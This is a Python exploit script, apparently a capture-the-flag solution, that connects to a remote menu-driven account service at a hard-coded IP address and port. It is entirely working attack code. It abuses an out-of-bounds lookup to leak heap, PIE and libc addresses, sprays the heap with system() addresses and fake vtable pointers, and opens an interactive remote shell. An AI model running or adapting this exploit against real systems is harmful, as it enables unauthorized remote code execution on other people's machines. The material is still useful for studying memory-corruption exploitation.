import pwnbox,struct
pack = lambda x: struct.pack("<Q",x)
p = pwnbox.pipe.SocketPipe("110.10.212.140", 5559,log_to=None)
off_setvbuf = 0x06fe70
off_system = 0x045390
off_binsh = 0x18c177
off_puts = 0x6f690

def gen_id(name,pw,info,first=False):
  if not first:
    p.read_until(">")
    p.write("2\n")
  for x in [name,pw,pw,info]:
    p.read_until(":")
    p.write(x+"\n")

def delete_id(name,pw):
  p.read_until(">")
  p.write("3\n")
  p.read_until("?")
  p.write(name+"\n")
  p.read_until(":")
  p.write(pw+"\n")

def login(name,pw):
  p.read_until(">")
  p.write("1\n")
  for x in [name,pw]:
    p.read_until(":")
    p.write(x+"\n")

def other_info(idx,ty):
  p.read_until(">")
  p.write("3\n")
  p.read_until(">")
  p.write("3\n")
  p.read_until("?")
  p.write("%d\n"%idx)
  p.read_until(">")
  p.write("%d\n"%ty)
  p.read_until(": ")
  ret = p.read_until("1. Change password").split("1. Change password")[0]
  p.read_until(">")
  p.write("5\n")
  return ret
def change(pw):
  p.read_until(">")
  p.write("3\n")
  p.read_until(">")
  p.write("1\n")
  p.read_until(": ")
  p.write(pw+"\n")
  ret = p.read_until("1. Change password").split("1. Change password")[0]
  p.read_until(">")
  p.write("5\n")

def win():
  with open("cheet","rb") as f:
    p.write(f.read())
  p.read_until("Logout.")

gen_id("B"*0x40,"D"*0x40,"sh;;"*0x10,True)
gen_id("A"*0x40,"C"*0x40,"sh;;"*0x10)
login("A"*0x40,"C"*0x40)
setvbuf = 0x204F18
heap = int(other_info(0,1)[2:],16)-0x11cc0
pie =  int(other_info(6,1)[2:],16) - 0x204c88
libc_setvbuf =int(other_info((-(heap+0x11c20)+(pie+setvbuf))/8,1)[2:],16) 
libc = libc_setvbuf-off_setvbuf
system = libc+off_system
print "HEAP : "+hex(heap)
print "PIE : "+ hex(pie)
print "LIBC : " + hex(libc)
new_heap = libc-0x1e4f8000
win()
print "WIN!"
p.read_until(">")
p.write("3\n")
p.read_until("?")
p.write("A"*3+pack(system)*0xf00000+"\n")

cmd = "sh;"*100
for i in range(50,130):
  p.read_until(">")
  p.write("3\n")
  p.read_until("?")
  vtab = ((new_heap & 0xffffffffff000000)+0x13b6873)
  print hex(vtab)
  p.write(pack(vtab)*5+cmd[:(i-40)]+"\n")

p.read_until(">")
p.write("2\n")
print "GET SHELL"
p.interact()
